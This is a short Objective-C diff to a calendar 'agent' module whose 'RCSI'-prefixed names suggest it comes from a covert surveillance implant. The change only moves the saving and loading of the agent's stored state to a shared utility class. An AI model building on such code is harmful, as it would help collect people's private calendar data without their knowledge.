@@ -10,6 +10,7 @@
 #import "RCSICommon.h"
 #import "EventKit.h"
 #import "RCSILogManager.h"
+#import "RCSIUtils.h"
 
 //#define DEBUG_CAL
 
@@ -50,7 +51,9 @@ NSString *k_i_AgentCalendarRunLoopMode = @"k_i_AgentCalendarRunLoopMode";
   NSDictionary *agentDict     = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: eventDateDict, nil]
                                                               forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
   
-  setRcsPropertyWithName([[self class] description], agentDict);
+  //setRcsPropertyWithName([[self class] description], agentDict);
+  [[_i_Utils sharedInstance] setPropertyWithName:[[self class] description]
+                                  withDictionary:agentDict];
   
   [agentDict release];
   [eventDateDict release];
@@ -66,8 +69,9 @@ NSString *k_i_AgentCalendarRunLoopMode = @"k_i_AgentCalendarRunLoopMode";
 
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
-  agentDict = rcsPropertyWithName([[self class] description]);
-
+  //agentDict = rcsPropertyWithName([[self class] description]);
+  agentDict = [[_i_Utils sharedInstance] getPropertyWithName:[[self class] description]];
+  
   if (agentDict == nil) 
     {
       return YES;
